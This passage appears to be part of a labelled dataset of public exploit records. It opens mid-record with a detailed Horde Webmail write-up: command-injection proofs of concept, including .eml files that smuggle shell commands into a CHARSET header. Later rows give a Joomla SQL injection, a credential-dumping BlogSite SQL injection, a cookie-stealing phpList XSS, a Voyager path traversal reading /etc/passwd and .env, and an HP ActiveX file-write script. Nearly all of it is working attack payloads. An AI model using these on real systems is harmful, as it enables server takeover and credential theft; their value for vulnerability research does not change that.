IMP_Crypt_Pgp::SYM_ENCRYPT: /* 1737 */ $to_list = clone $to; /* 1738 */ if (count($options['from'])) { /* 1739 */ $to_list->add($options['from']); /* 1740 */ } /* 1741 */ $base = $imp_pgp->IMPencryptMIMEPart($base, $to_list, ($encrypt == IMP_Crypt_Pgp::SYM_ENCRYPT) ? $symmetric_passphrase : null); /* 1742 */ break;  Here we can see validation (1695-1696 lines) that:  Current user has enabled “use_pgp” feature in his preferences (it is not a problem as an attacker can edit his own preferences) $conf[‘gnupg’][‘path’] is not empty. This value can be edited only by admin. So if we don’t have value here our server is not vulnerable. But if admin wants to allow users to use GPG feature he/she needs to define value for this config.  Also we can see that in lines 1737-1739 to our recipient list will be added address “from” as well.  Path: /imp/lib/Crypt/Pgp.php  /* 584 */ public function impEncryptMimePart($mime_part, /* 585 */ Horde_Mail_Rfc822_List $addresses, /* 586 */ $symmetric = null) /* 587 */ { /* 588 */ return $this->encryptMimePart($mime_part, $this->_encryptParameters($addresses, $symmetric)); /* 589 */ }  Before encryptMimePart() call Horde uses _encryptParameters()  Path: /imp/lib/Crypt/Pgp.php  /* 536 */ protected function _encryptParameters(Horde_Mail_Rfc822_List $addresses, /* 537 */ $symmetric) /* 538 */ { /* ... */ /* 546 */ $addr_list = array(); /* 548 */ foreach ($addresses as $val) { /* 549 */ /* Get the public key for the address. */ /* 550 */ $bare_addr = $val->bare_address; /* 551 */ $addr_list[$bare_addr] = $this->getPublicKey($bare_addr); /* 552 */ } /* 554 */ return array('recips' => $addr_list); /* 555 */ }  Horde will add to each address its Public Key. There a few source of Public Keys:  AddressBook (we will use this source) Servers with Public Keys  Note that Horde should be able to find Public Key for our “From” address as well. We can generate pair of PGP keys (https is required) or we can use the same trick with AddressBook (we can create some contact, add any valid Public PGP key, and add this address to default identity) encryptMimePart() will call encrypt() method  Path: /Horde/Crypt/Pgp.php  /* 773 */ public function encryptMIMEPart($mime_part, $params = array()) /* 774 */ { /* 775 */ $params = array_merge($params, array('type' => 'message')); /* … */ /* 781 */ $message_encrypt = $this->encrypt($signenc_body, $params);  It will call encryptMessage()  Path: /Horde/Crypt/Pgp.php  /* 554 */ public function encrypt($text, $params = array()) /* 555 */ { /* 556 */ switch (isset($params['type']) ? $params['type'] : false) { /* 557 */ case 'message': /* 558 */ $error = Horde_Crypt_Translation::t( /* 559 */ ""Could not PGP encrypt message."" /* 560 */ ); /* 561 */ $func = 'encryptMessage'; /* 562 */ break; /* ... */ /* 586 */ $this->_initDrivers(); /* 587 */ /* 588 */ foreach ($this->_backends as $val) { /* 589 */ try { /* 590 */ return $val->$func($text, $params); /* 591 */ } catch (Horde_Crypt_Exception $e) {} /* 592 */ }  In conclusions: If Horde server has enabled “GnuPG feature” any unprivileged user is able to execute arbitrary code.  Enable GPG feature for attacker account (“Enable PGP functionality?” checkbox on “PGP Configure PGP encryption support.” section in Prefferences->Mail page ) Create some contact in the attacker AddressBook, add any valid Public PGP key, and add this address to default identity Create another contact in the attacker AddressBook, add any valid Public PGP key, and change email address to some$(desired command to execute) contact@somedomain.com Create a new message to some$(desired command to execute) contact@somedomain.com Choose Encryption:PGP Encrypt Message option Click Send button  And desired command will be executed on the Horde server.  Proof of Concept – Authenticated Code Execution  For Proof of Concept we can use preconfigured image of Horde server from Bitnami (Bitnami – “Easy to use cloud images, containers, and VMs that work on any platform”):  https://downloads.bitnami.com/files/stacks/horde/5.2.17-0/bitnami-horde-5.2.17-0-linux-ubuntu-14.04-x86_64.ova  Step 1 – Login as admin (by default user:bitnami) and go to Administration -> Configuration and choose Horde (horde). Open GnuPG tab, enter /usr/bin/gpg into $conf[gnupg][path] setting and click “Generate Horde Configuration“:  Now we have enabled GPG feature on our server and we can login as regular user and try to execute desired commands. But Bitnami image does not have installed and configured Mail server so we need to use external one or install it on local machine.  We will use gmail account (to be able to login to it from Horde I had to change Gmail account setting Allow less secure apps: ON).  To use external Mail server we need to change the next setting: “Administrator Panel” -> “Configuration” -> “Horde” -> “Authentication”  Step 2 – Configure Horde web-mail authentication ($conf[auth][driver]) to “Let a Horde application handle authentication” and click “Generate Horde Configuration”:  Step 3 – logout and login with your gmail account. Currently we are login as regular user so we can try to execute desired commands:  Go to Preferences -> Mail and click on PGP link. Check Enable PGP functionality? checkbox and click “Save”:  Create “from” contact in our AddressBook: “Address Book -> New Contact -> in Address Book of …”  Personal tab – Last Name: mymailboxwithPGPkey Communication tab – Email: mymailboxwihPGP@any.com Other tab – PGP Public Key: any valid Public PGP key.  For example:  -----BEGIN PGP PUBLIC KEY BLOCK----- Version: SKS 1.1.6 Comment: Hostname: keyserver.ubuntu.com mQGiBDk89iARBADhB7AyHQ/ZBlZjRRp1/911XaXGGmq1LDLTUTCAbJyQ1TzKDdetfT9Szk01 YPdAnovgzxTS89svuVHP/BiqLqhJMl2FfMLcJX+va+DujGuLDCZDHi+4czc33N3z8ArpxzPQ 5bfALrpNMJi6v2gZkDQAjMoeKrNEfXLCXQbTYWCuhwCgnZZCThya4xhmlLCTkwsQdMjFoj8D /iOIP/6W27opMJgZqTHcisFPF6Kqyxe6GAftJo6ZtLEG26k2Qn3O0pghDz2Ql4aDVki3ms82 z77raSqbZVJzAFPzYoIKuc3JOoxxE+SelzSzj4LuQRXYKqZzT8/qYBCLg9cmhdm8PnwE9fd/ POGnNQFMk0i2xSz0FMr9R1emIKNsA/454RHIZ39ebvZzVULS1pSo6cI7DAJFQ3ejJqEEdAbr 72CW3eFUAdF+4bJQU/V69Nr+CmziBbyqKP6HfiUH9u8NLrYuK6XWXLVVSCBPsOxHxhw48hch zVxJZ5Cyo/tMSOY/CxvLL/vMoT2+kQX1SCsWALosKJyOGbpCJmPasOLKdrQnQWxpY2UgKFJl Y2h0c2Fud8OkbHRpbikgPGFsaWNlQGN5Yi5vcmc+iEYEEBECAAYFAjk+IEgACgkQzDSD4hsI fQSaWQCgiDvvnRxa8XFOKy/NI7CKL5X4D28An2k9Cbh+dosXvB5zGCuQiAkLiQ+CiEYEEREC AAYFAkKTPFcACgkQCY+3LE2/Ce4l+gCdFSHqp5HQCMKSOkLodepoG0FiQuwAnR2nioCQ3A5k YI0NfUth+0QzJs1ciFYEExECABYFAjk89iAECwoEAwMVAwIDFgIBAheAAAoJEFsqCm37V5ep fpAAoJezEplLlaGQHM8ppKReVHSyGuX+AKCYwRcwJJwoQHM8p86xhSuC/opYPoheBBMRAgAW BQI5PPYgBAsKBAMDFQMCAxYCAQIXgAASCRBbKgpt+1eXqQdlR1BHAAEBfpAAoJezEplLlaGQ HM8ppKReVHSyGuX+AKCYwRcwJJwoQHM8p86xhSuC/opYPrkBDQQ5PPYqEAQArSW27DriJAFs Or+fnb3VwsYvznFfEv8NJyM/9/lDYfIROHIhdKCWswUWCgoz813RO2taJi5p8faM048Vczu/ VefTzVrsvpgXUIPQoXjgnbo6UCNuLqGk6TnwdJPPNLuIZLBEhGdA+URtFOA5tSj67h0G4fo0 P8xmsUXNgWVxX/MAAwUD/jUPLFgQ4ThcuUpxCkjMz+Pix0o37tOrFOU/H0cn9SHzCQKxn+iC sqZlCsR+qXNDl43vSa6Riv/aHtrD+MJLgdIVkufuBWOogtuojusnFGY73xvvM1MfbG+QaUqw gfe4UYOchLBNVtfN3WiqSPq5Yhue4m1u/xIvGGJQXvSBxNQyiEYEGBECAAYFAjk89ioACgkQ WyoKbftXl6kV5QCfV7GjnmicwJPgxUQbDMP9u5KuVcsAn3aSmYyI1u6RRlKoThh0WEHayISv iE4EGBECAAYFAjk89ioAEgkQWyoKbftXl6kHZUdQRwABARXlAJ9XsaOeaJzAk+DFRBsMw/27 kq5VywCfdpKZjIjW7pFGUqhOGHRYQdrIhK8= =RHjX -----END PGP PUBLIC KEY BLOCK-----  Click “Add” button:  Go to Preferences -> Global Preferences and click on Personal Information link. Put mymailboxwihPGP@any.com into field The default e-mail address to use with this identity and Click “Save”:  Create our “to” contact in our AddressBook: “Address Book -> New Contact -> in Address Book of …”  Personal tab – Last Name: contact_for_attack Communication tab – Email: hereinj@any.com Other tab – PGP Public Key: any valid Public PGP key (it can be the same as in the previous step) And click “Add” button:  Inject our command: Click on Edit. Go to Communication Tab, put cursor in Email field and chose “Inspect Element (Q)” from context menu:  Delete “email” from the type argument and close Inspector:  1 <input name=""object[email]"" id=""object_email_"" value=""hereinj@any.com"" type=""email"">  Edit the address as we want – for example hereinj$(touch /tmp/hereisvuln)@any.com and click “Save”:  Create a new message ( Mail -> New Message) with our contact as recipient:  Choose PGP Encrypt Message in Encryption option:  Enter any subject and any content. Click “Send”  We will get “PGP Error:…”  It is ok – let’s check our server:  We have a new file “hereisvuln” so our command was executed.  Unauthentication Remote Code Execution Horde Webmail contains a vulnerability that allows a remote attacker to execute arbitrary code with the privileges of the user who runs the web server.  Vulnerable code: decryptSignature() function of GPG feature.  Path: /Horde/Crypt/Pgp/Backend/Binary.php:  /* 539 */ public function decryptSignature($text, $params) /* 540 */ { /* ... */ /* 550 */ /* Options for the GPG binary. */ /* 551 */ $cmdline = array( /* 552 */ '--armor', /* 553 */ '--always-trust', /* 554 */ '--batch', /* 555 */ '--charset ' . (isset($params['charset']) ? $params['charset'] : 'UTF-8'), /* 556 */ $keyring, /* 557 */ '--verify' /* 558 */ ); /* ... */ /* 571 */ $result = $this->_callGpg($cmdline, 'r', null, true, true, true); /* ... */  $params[‘charset’] will be added to $cmdline array and passed to _callGpg():  /* 642 */ public function _callGpg( /* 643 */ $options, $mode, $input = array(), $output = false, $stderr = false, /* 644 */ $parseable = false, $verbose = false /* 645 */ ) /* 646 */ { /* … */ /* 675 */ $cmdline = implode(' ', array_merge($this->_gnupg, $options)); /* … */ /* 681 */ if ($mode == 'w') { /* … */ /* 704 */ } elseif ($mode == 'r') { /* 705 */ if ($fp = popen($cmdline, 'r')) { /* … */  Our $params[‘charset’] will be in command line that is going to be executed.  decryptSignature() is called from decrypt() method:  Path – /Horde/Crypt/Pgp.php:  /* 611 */ public function decrypt($text, $params = array()) /* 612 */ { /* 613 */ switch (isset($params['type']) ? $params['type'] : false) { /* 614 */ case 'detached-signature': /* 615 */ case 'signature': /* 616 */ /* Check for required parameters. */ /* 617 */ if (!isset($params['pubkey'])) { /* 618 */ throw new InvalidArgumentException( /* 619 */ 'A public PGP key is required to verify a signed message.' /* 620 */ ); /* 621 */ } /* 622 */ if (($params['type'] === 'detached-signature') && /* 623 */ !isset($params['signature'])) { /* 624 */ throw new InvalidArgumentException( /* 625 */ 'The detached PGP signature block is required to verify the signed message.' /* 626 */ ); /* 627 */ } /* 628 */ /* 629 */ $func = 'decryptSignature'; /* 630 */ break; /* ... */ /* 650 */ $this->_initDrivers(); /* 651 */ /* 652 */ foreach ($this->_backends as $val) { /* 653 */ try { /* 654 */ return $val->$func($text, $params); /* 655 */ } catch (Horde_Crypt_Exception $e) {} /* 656 */ } /* ... */  decrypt() with needed parameters is used in verifySignature():  Path – /imp/lib/Crypt/Pgp.php  /* 339 */ public function verifySignature($text, $address, $signature = '', /* 340 */ $charset = null) /* 341 */ { /* 342 */ if (!empty($signature)) { /* 343 */ $packet_info = $this->pgpPacketInformation($signature); /* 344 */ if (isset($packet_info['keyid'])) { /* 345 */ $keyid = $packet_info['keyid']; /* 346 */ } /* 347 */ } /* 349 */ if (!isset($keyid)) { /* 350 */ $keyid = $this->getSignersKeyID($text); /* 351 */ } /* 353 */ /* Get key ID of key. */ /* 354 */ $public_key = $this->getPublicKey($address, array('keyid' => $keyid)); /* 356 */ if (empty($signature)) { /* 357 */ $options = array('type' => 'signature'); /* 358 */ } else { /* 359 */ $options = array('type' => 'detached-signature', 'signature' => $signature); /* 360 */ } /* 361 */ $options['pubkey'] = $public_key; /* 363 */ if (!empty($charset)) { /* 364 */ $options['charset'] = $charset; /* 365 */ } /* 369 */ return $this->decrypt($text, $options); /* 370 */ }  verifySignature() is called from _outputPGPSigned():  Path – /imp/lib/Mime/Viewer/Pgp.php  /* 387 */ protected function _outputPGPSigned() /* 388 */ { /* 389 */ global $conf, $injector, $prefs, $registry, $session; /* 390 */ /* 391 */ $partlist = array_keys($this->_mimepart->contentTypeMap()); /* 392 */ $base_id = reset($partlist); /* 393 */ $signed_id = next($partlist); /* 394 */ $sig_id = Horde_Mime::mimeIdArithmetic($signed_id, 'next'); /* 395 */ /* 396 */ if (!$prefs->getValue('use_pgp') || empty($conf['gnupg']['path'])) { /* 397 */ return array( /* 398 */ $sig_id => null /* 399 */ ); /* 400 */ } /* ... */ /* 417 */ if ($prefs->getValue('pgp_verify') || /* 418 */ $injector->getInstance('Horde_Variables')->pgp_verify_msg) { /* 419 */ $imp_contents = $this->getConfigParam('imp_contents'); /* 420 */ $sig_part = $imp_contents->getMIMEPart($sig_id); /* ... */ /* 433 */ try { /* 434 */ $imp_pgp = $injector->getInstance('IMP_Crypt_Pgp'); /* 435 */ if ($sig_raw = $sig_part->getMetadata(Horde_Crypt_Pgp_Parse::SIG_RAW)) { /* 436 */ $sig_result = $imp_pgp->verifySignature($sig_raw, $this->_getSender()->bare_address, null, $sig_part- > getMetadata(Horde_Crypt_Pgp_Parse::SIG_CHARSET)); /* ... */  And it is used in _renderInline():  Path – /imp/lib/Mime/Viewer/Pgp.php  /* 134 */ protected function _renderInline() /* 135 */ { /* 136 */ $id = $this->_mimepart->getMimeId(); /* 138 */ switch ($this->_mimepart->getType()) { /* ... */ /* 142 */ case 'multipart/signed': /* 143 */ return $this->_outputPGPSigned();  Let’s go back to _outputPGPSigned() method. We can see a few requirements before the needed call:  $conf[‘gnupg’][‘path’] should be not empty. This value can be edited only by admin(if he/she wants to allow users to use GPG feature he/she needs to define value for this config). Current user has enabled “use_pgp” feature in his preferences Current user has enabled “pgp_verify” feature in his preferences Current user has enabled “pgp_verify” feature in his preferences  Also we see that our charset value is taken from $sig_part -> getMetadata(Horde_Crypt_Pgp_Parse::SIG_CHARSET)  Our value will be stored during parsing of PGP parts:  Path – /Horde/Crypt/Pgp/Parse.php  /* 150 */ public function parseToPart($text, $charset = 'UTF-8') /* 151 */ { /* 152 */ $parts = $this->parse($text); /* ... */ /* 162 */ while (list(,$val) = each($parts)) { /* 163 */ switch ($val['type']) { /* ... */ /* 200 */ case self::ARMOR_SIGNED_MESSAGE: /* 201 */ if ((list(,$sig) = each($parts)) && /* 202 */ ($sig['type'] == self::ARMOR_SIGNATURE)) { /* 203 */ $part = new Horde_Mime_Part(); /* 204 */ $part->setType('multipart/signed'); /* 205 */ // TODO: add micalg parameter /* 206 */ $part->setContentTypeParameter('protocol', 'application/pgp-signature'); /* 207 */ /* 208 */ $part1 = new Horde_Mime_Part(); /* 209 */ $part1->setType('text/plain'); /* 210 */ $part1->setCharset($charset); /* 211 */ /* 212 */ $part1_data = implode(""\n"", $val['data']); /* 213 */ $part1->setContents(substr($part1_data, strpos($part1_data, ""\n\n"") + 2)); /* 214 */ /* 215 */ $part2 = new Horde_Mime_Part(); /* 216 */ /* 217 */ $part2->setType('application/pgp-signature'); /* 218 */ $part2->setContents(implode(""\n"", $sig['data'])); /* 219 */ /* 220 */ $part2->setMetadata(self::SIG_CHARSET, $charset); /* 221 */ $part2->setMetadata(self::SIG_RAW, implode(""\n"", $val['data']) . ""\n"" . implode(""\n"", $sig['data'])); /* 222 */ /* 223 */ $part->addPart($part1); /* 224 */ $part->addPart($part2); /* 225 */ $new_part->addPart($part); /* 226 */ /* 227 */ next($parts); /* 228 */ } /* 229 */ } /* 230 */ } /* 231 */ /* 232 */ return $new_part; /* 233 */ }  It is called from _parsePGP():  Path – /imp/lib/Mime/Viewer/Plain.php  × 1 2 3 4 5 6 7 8 /* 239 */ protected function _parsePGP() /* 240 */ { /* 241 */ $part = $GLOBALS['injector']->getInstance('Horde_Crypt_Pgp_Parse')->parseToPart( /* 242 */ new Horde_Stream_Existing(array( /* 243 */ 'stream' => $this->_mimepart->getContents(array('stream' => true)) /* 244 */ )), /* 245 */ $this->_mimepart->getCharset() /* 246 */ );  Our charset value is taken from CHARSET attribute of Content-Type header of parent MIMEpart.  _parsePGP() is used in _getEmbeddedMimeParts() method and from Horde Webmail ver 5.2.0 it looks like:  Path – /imp/lib/Mime/Viewer/Plain.php  /* 222 */ protected function _getEmbeddedMimeParts() /* 223 */ { /* 224 */ $ret = $this->getConfigParam('pgp_inline') /* 225 */ ? $this->_parsePGP() /* 226 */ : null;  We can see an additional requirement – our function will be called only if ‘pgp_inline‘ config parameter is “true”. It is defined in:  Path – /imp/config/mime_drivers.php  /* 37 */ /* Scans the text for inline PGP data. If true, will strip this data /* 38 */ * out of the output (and, if PGP is active, will display the /* 39 */ * results of the PGP action). */ /* 40 */ 'pgp_inline' => false  Default value is false, so the major part of Horde servers is not vulnerable and our attack is relevant only if an admin manually has changed this line to ‘pgp_inline‘ => true.  But in older versions (before 5.2.0) the code of _getEmbeddedMimeParts() is a bit different:  Path – /imp/lib/Mime/Viewer/Plain.php  /* 227 */ protected function _getEmbeddedMimeParts() /* 228 */ { /* 229 */ $ret = null; /* 230 */ /* 231 */ if (!empty($GLOBALS['conf']['gnupg']['path']) && /* 232 */ $GLOBALS['prefs']->getValue('pgp_scan_body')) { /* 233 */ $ret = $this->_parsePGP(); /* 234 */ }  So instead of requirement to have config parameter we have requirement of ‘pgp_scan_body‘ Preference of current user. And it is more likely to find a victim with needed preferences. We saw where our injected command is executed and from where and when it is taken  During rendering of massage we:  Will parse PGP values:  #0 IMP_Mime_Viewer_Plain->_parsePGP() called at [/imp/lib/Mime/Viewer/Plain.php:225] #1 IMP_Mime_Viewer_Plain->_getEmbeddedMimeParts() called at [/Horde/Mime/Viewer/Base.php:298] #2 Horde_Mime_Viewer_Base->getEmbeddedMimeParts() called at [/imp/lib/Contents.php:1114] #3 IMP_Contents->_buildMessage() called at [/imp/lib/Contents.php:1186] #4 IMP_Contents->getContentTypeMap() called at [/imp/lib/Contents.php:1423] #5 IMP_Contents->getInlineOutput() called at [/imp/lib/Ajax/Application/ShowMessage.php:296]  Will use them in:  #0 IMP_Mime_Viewer_Plain->_parsePGP() called at [/imp/lib/Mime/Viewer/Plain.php:225] #0 IMP_Mime_Viewer_Pgp->_renderInline() called at [/Horde/Mime/Viewer/Base.php:156] #1 Horde_Mime_Viewer_Base->render() called at [/Horde/Mime/Viewer/Base.php:207] #2 Horde_Mime_Viewer_Base->_renderInline() called at [/Horde/Mime/Viewer/Base.php:156] #3 Horde_Mime_Viewer_Base->render() called at [/imp/lib/Contents.php:654] #4 IMP_Contents->renderMIMEPart() called at [/imp/lib/Contents.php:1462] #5 IMP_Contents->getInlineOutput() called at [/imp/lib/Ajax/Application/ShowMessage.php:296]]  In conclusions:  If Horde server has vulnerable configuration:  Enabled “GnuPG feature” (there is path to gpg binary in $conf[gnupg][path] setting) Only for ver 5.2.0 and newer: ‘pgp_inline’ => true, in /imp/config/mime_drivers.php  And the victim has checked the next checkbox in his/her preferences ( “PGP Configure PGP encryption support.” in Prefferences->Mail) :  “Enable PGP functionality” “Should PGP signed messages be automatically verified when viewed?” if it is not checked our command will be executed when the victim clicks on the link “Click HERE to verify the message.” For versions before 5.2.0: “Should the body of plaintext message be scanned for PGP data”  An attacker can create email with PGP data, put desired command into CHARSET attribute of ContentType header, and this command will be executed on Horde server when the victim opens this email.  Proof of Concept – Remote Code Execution  For Proof of Concept we can use preconfigured image of Horde server from Bitnami (Bitnami – “Easy to use cloud images, containers, and VMs that work on any platform”):  https://downloads.bitnami.com/files/stacks/horde/5.2.17-0/bitnami-horde-5.2.17-0-linux-ubuntu-14.04-x86_64.ova  Step 1 – Login as admin (by default user:bitnami) and go to Administration -> Configuration and choose Horde (horde). Open GnuPG tab, enter /usr/bin/gpg into $conf[gnupg][path] setting and click “Generate Horde Configuration“:  Now we have enabled GPG feature on our server and we can login as regular user and try to execute desired commands. But Bitnami image does not have installed and configured Mail server so we need to use external one or install it on local machine.  We will use gmail account (to be able to login to it from Horde I had to change Gmail account setting Allow less secure apps: ON).  To use external Mail server we need to change the next setting: “Administrator Panel” -> “Configuration” -> “Horde” -> “Authentication”  Configure the application authentication ($conf[auth][driver]) – change this option to “Let a Horde application handle authentication” and click “Generate Horde Configuration”.  If we have Horde Webmail ver 5.2.0 or newer we need to edit /imp/config/mime_drivers.php file. Login to the console of bitnami image (default bitnami:bitnami) and run the next command:  sudo nano /opt/bitnami/apps/horde/htdocs/imp/config/mime_drivers.php  Change the line: “‘pgp_inline’ => false” to “‘pgp_inline’ => true” and save the changes.  Step 2 – Logout and login with your gmail account.  Step 3 – Go to Preferences -> Mail and click on PGP link:  Check Enable PGP functionality checkbox and click “Save” Check Should PGP signed messages be automatically verified when viewed checkbox For versions before 5.2.0 check “Should the body of plain-text message be scanned for PGP data” checkbox Click “Save”  For version before 5.2.0:  Step 4 – Go to the Mail, take any mail folder (for example Drafts), and chose “Import” item from context menu and import attack_whoami.eml file (in the end of this blog).  Click on the imported email:  Our Horde serve is launched under daemon user  Step 5 – We can do the same with attack_touch.eml (in the end of this blog) file (import it and click on the new mail) and check /tmp folder:  attack_touch.eml  Date: Fri, 04 Nov 2016 16:04:19 +0000 Message-ID: <20161104160419.Horde.HpYObg_3-4QS-nUzWujEkg3@ubvm.mydomain.com> From: Donald Trump <attacker@attacker.com> To: SomeUser@mydoamin.com Subject: PGP_INLine_touch_tmp_youarevuln X-IMP-Draft: Yes Content-Type: text/plain; CHARSET=""US-ASCII`touch /tmp/youarevuln`""; format=flowed; DelSp=Yes MIME-Version: 1.0 Content-Disposition: inline   -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  This is a sample of a clear signed message.  -----BEGIN PGP SIGNATURE----- Version: 2.6.2  iQCVAwUBMoSCcM4T3nOFCCzVAQF4aAP/eaP2nssHHDTHyPBSjgwyzryguwBd2szF U5IFy5JfU+PAa6NV6m/UWW8IKczNX2cmaKQNgubwl3w0odFQPUS+nZ9myo5QtRZh DztuhjzJMEzwtm8KTKBnF/LJ9X05pSQUvoHfLZ/waJdVt4E/xfEs90l8DT1HDdIz CvynscaD+wA= =Xb9n -----END PGP SIGNATURE-----  attack_whoami.eml  Date: Fri, 04 Nov 2016 16:04:19 +0000 Message-ID: <20161104160419.Horde.HpYObg_3-4QS-nUzWujEkg3@ubvm.mydomain.com> From: Donald Trump <attacker@attacker.com> To: SomeUser@mydoamin.com Subject: PGP_INLine_whoami X-IMP-Draft: Yes Content-Type: text/plain; CHARSET=US-ASCII`whoami`; format=flowed; DelSp=Yes MIME-Version: 1.0 Content-Disposition: inline   -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  This is a sample of a clear signed message.  -----BEGIN PGP SIGNATURE----- Version: 2.6.2  iQCVAwUBMoSCcM4T3nOFCCzVAQFJaAP/eaP2nssHHDTHyPBSjgwyzryguwBd2szF U5IFy5JfU+PAa6NV6m/UWW8IKczNX2cmaKQNgubwl3w0odFQPUS+nZ9myo5QtRZh DztuhjzJMEzwtm8KTKBnF/LJ9X05pSsUvoHfLZ/waJdVt4E/xfEs90l8DT1HDdIz CvynscaD+wA= =Xb9n -----END PGP SIGNATURE-----",['3/4/5'],1
42417,"Joomla! Component Ultimate Property Listing 1.0.2 - SQL Injection # # # # # # Exploit Title: Joomla! Component Ultimate Property Listing v1.0.2 - SQL Injection # Dork: N/A # Date: 02.08.2017 # Vendor : http://faboba.com/ # Software: https://extensions.joomla.org/extensions/extension/vertical-markets/real-estate/ultimate-property-listing/ # Demo: http://demoupl.faboba.com/ # Version: 1.0.2 # # # # # # Author: Ihsan Sencan # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/index.php?option=com_upl&view=propertylisting&sf_selectuser_id=[SQL] # -109'+UNION+ALL+SELECT+0x31,0x32,0x33,0x34,0x35,0x36,0x37,(sELECT+eXPORT_sET(0x35,@:=0,(sELECT+cOUNT(*)fROM(iNFORMATiON_sCHEMA.cOLUMNS)wHERE@:=eXPORT_sET(0x35,eXPORT_sET(0x35,@,tABLE_nAME,0x3c6c693e,2),cOLUMN_nAME,0xa3a,2)),@,0x32)),0x39,0x3130,0x3131,0x3132,0x3133,0x3134,0x3135,0x3136,0x3137,0x3138,0x3139,0x3230,0x3231,0x3232,0x3233,0x3234,0x3235,0x3236,0x3237,0x3238,0x3239,0x3330,0x3331,0x3332,0x3333,0x3334,0x3335,0x3336,0x3337,0x3338,0x3339,0x3430,0x3431,0x3432,0x3433,0x3434,0x3435,0x3436,0x3437,0x3438,0x3439,0x3530,0x3531,0x3532,0x3533,0x3534,0x3535,0x3536,0x3537,0x3538,0x3539,0x3630,0x3631,0x3632,0x3633,0x3634,0x3635,0x3636,0x3637,0x3638,0x3639,0x3730,0x3731,0x3732,0x3733,0x3734,0x3735,0x3736,0x3737,0x3738,0x3739,0x3830,0x3831,0x3832,0x3833,0x3834,0x3835,0x3836,0x3837--+- # http://localhost/[PATH]/index.php?option=com_upl&view=propertylisting&type=listing&sf_multiplelocation1_id=[SQL] # http://localhost/[PATH]/index.php?option=com_upl&view=propertylisting&type=listing&sf_multiplelisting=[SQL] # Etc.. # # # # #","['1.0.2', 'v1.0.2']",0
4206,"Blog System 1.x - 'index.php?news_id' SQL Injection --==+================================================================================+==-- --==+              BlogSite Professional SQL Injection Vulnerbility                  +==-- --==+================================================================================+==--    AUTHOR: t0pP8uZz & xprog SITE: N/A DORK: allintext:""Browse Blogs by Category""   DESCRIPTION: pull out admin/members login credentials   EXPLOITS: http://www.server.com/index.php?page_id=-1&news_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,concat(username,0x3a,password),4,5,6/**/FROM/**/websiteadmin_admin_users/*   NOTE/TIP: admin login is the normal login on index.php   GREETZ: milw0rm.com, H4CKY0u.org, G0t-Root.net/G0t-Root.org !   --==+================================================================================+==-- --==+              BlogSite Professional SQL Injection Vulnerbility                  +==-- --==+================================================================================+==--  # milw0rm.com [2007-07-20]",['1.x'],1
37590,phpList 2.10.18 - 'unconfirmed' Cross-Site Scripting source: https://www.securityfocus.com/bid/54887/info  PHPList is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  PHPList 2.10.18 is vulnerable; other versions may also be affected.  http://www.example.com/admin/?page=user&find=1&unconfirmed=%22%3 %3Cscript%3Ealert%28document.cookie%29;%3C/s cript%3E,['2.10.18'],1
47875,"Voyager 1.3.0 - Directory Traversal # Exploit Title: Voyager 1.3.0 - Directory Traversal # Google Dork: N/A # Date: January 2020-01-06 # Exploit Author: NgoAnhDuc # Vendor Homepage: https://voyager.devdojo.com/ # Software Link:https://github.com/the-control-group/voyager/releases/tag/v1.3.0https://github.com/the-control-group/voyager/releases/tag/v1.2.7 # Version: 1.3.0 and bellow # Tested on: Ubuntu 18.04 # CVE : N/A   Vulnerable code is in voyager/src/Http/Controllers/VoyagerController.php  ========================================  public function assets(Request $request)     {         *$path = str_start(str_replace(['../', './'], '', urldecode($request->path)), '/');* *        $path = base_path('vendor/tcg/voyager/publishable/assets'.$path);*         if (File::exists($path)) {             $mime = '';             if (ends_with($path, '.js')) {                 $mime = 'text/javascript';             } elseif (ends_with($path, '.css')) {                 $mime = 'text/css';             } else {                 $mime = File::mimeType($path);             }             $response = response(File::get($path), 200, ['Content-Type' => $mime]);             $response->setSharedMaxAge(31536000);             $response->setMaxAge(31536000);             $response->setExpires(new \DateTime('+1 year'));             return $response;         }         return response('', 404);     } ========================================  PoC:  passwd:  http://localhost/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd   Laravel environment file:http://localhost/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F<web root dir>/.env",['1.3.0'],1
31878,"HP Instant Support 1.0.22 - 'HPISDataManager.dll' ActiveX Control Arbitrary File Creation source: https://www.securityfocus.com/bid/29535/info  HP Instant Support 'HPISDataManager.dll' ActiveX control is prone to a vulnerability that lets attackers create and overwrite files with arbitrary, attacker-controlled content.  Successful exploits may compromise affected computers and aid in further attacks.  HP Instant Support 1.0.0.22 and earlier versions are affected.  NOTE: This issue was previously covered in BID 29526 (HP Instant Support 'HPISDataManager.dll' ActiveX Control Unspecified Code Execution Vulnerabilities), but has been given its own record because of new information.  <?XML version='1.0' standalone='yes' ?> <package><job id='DoneInVBS' debug='false' error='true'> <object classid='clsid:14C1B87C-3342-445F-9B5E-365FF330A3AC' id='target' /> <script language='vbscript'> targetFile = ""C:\WINDOWS\Downloaded Program Files\HPISDataManager.dll"" prototype = ""Sub AppendStringToFile ( ByVal bstrInputFileName As String , ByVal bstrInputString As String )"" memberName = ""AppendStringToFile"" progid = ""HPISDataManagerLib.Datamgr"" argCount = 2 arg1=""c:\evil.exe"" arg2=String(""CSIS entered this"") target.AppendStringToFile arg1 ,arg2 </script></job></package>","['1.0.22', '1.0.0.22', 'earlier versions']",0
